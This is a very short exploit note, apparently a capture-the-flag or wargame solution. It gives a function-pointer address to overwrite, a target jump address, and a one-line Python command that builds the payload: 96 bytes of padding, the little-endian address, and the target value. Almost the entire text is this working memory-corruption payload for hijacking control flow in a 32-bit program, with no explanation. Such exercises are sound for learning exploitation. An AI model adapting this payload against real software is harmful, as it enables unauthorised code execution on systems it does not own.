# 0x0804a004 function offset to be overwritten (no white-space characters)
# 134520836

# 0x80485e3 target location (for the goto)
# 134514147 (to be input)



python -c "print('a'*96 + '\x04\xa0\x04\x08' + '\n' + '134514147' + '\n')"
